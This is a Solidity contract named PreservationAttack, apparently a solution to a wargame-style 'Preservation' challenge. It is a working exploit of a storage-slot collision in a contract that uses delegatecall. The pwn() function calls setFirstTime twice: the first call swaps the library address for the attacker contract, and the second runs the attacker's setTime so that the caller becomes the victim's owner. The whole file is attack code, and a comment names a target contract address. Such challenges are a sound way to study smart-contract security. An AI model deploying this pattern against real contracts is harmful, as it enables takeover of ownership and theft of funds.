//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IPreservation {
//0xB1cC4A6EEa0D693F49B25FC95972Df002A0D0A90

    function setFirstTime(uint _timeStamp) external;
    function owner() external view returns (address);
}

contract PreservationAttack {

  address public _timeZone1Library;
  address public _timeZone2Library;
  address public owner;

  
  IPreservation preservationContract;
  constructor(address _preserveAddr) {
    preservationContract = IPreservation(_preserveAddr);
  } 

  function pwn() public {
    uint256 typecastedAddress = uint256(uint160(address(this)));
    // change delegateCalling address
    preservationContract.setFirstTime(typecastedAddress);
    // change delegateCalling address      
    preservationContract.setFirstTime(uint256(uint160(msg.sender)));
    require(preservationContract.owner() == msg.sender, "PWN FAILED");
  }



  function setTime(uint256 _owner) public {
    owner = address(uint160(_owner));
  }

}